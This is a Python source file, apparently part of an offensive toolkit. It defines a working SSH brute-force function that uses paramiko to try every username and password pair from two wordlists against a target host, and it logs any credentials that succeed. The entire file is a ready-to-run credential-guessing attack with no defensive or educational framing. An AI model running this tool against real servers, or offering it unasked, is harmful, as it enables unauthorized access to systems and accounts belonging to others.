import paramiko
import time
from modules.logger import log_result

def ssh_bruteforce(target, port, userlist, passlist):
    print(f"[+] Starting SSH brute-force on {target}:{port}")
    log_result(f"Starting SSH brute-force on {target}:{port}")

    try:
        with open(userlist, 'r') as users, open(passlist, 'r') as passwords:
            for username in users:
                username = username.strip()
                passwords.seek(0)
                for password in passwords:
                    password = password.strip()
                    ssh = None
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, port=port, username=username, password=password, timeout=5)
                        print(f"[SUCCESS] {username}:{password}")
                        log_result(f"[SUCCESS] {username}:{password}")
                        return
                    except paramiko.AuthenticationException:
                        print(f"[FAILED] {username}:{password}")
                        log_result(f"[FAILED] {username}:{password}")
                    except Exception as e:
                        print(f"[ERROR] {e}")
                        log_result(f"[ERROR] {e}")
                    finally:
                        if ssh:
                            ssh.close()
                    time.sleep(1)  # delay between attempts
    except FileNotFoundError:
        print("[!] Username or password file not found.")
        log_result("Username or password file not found.")
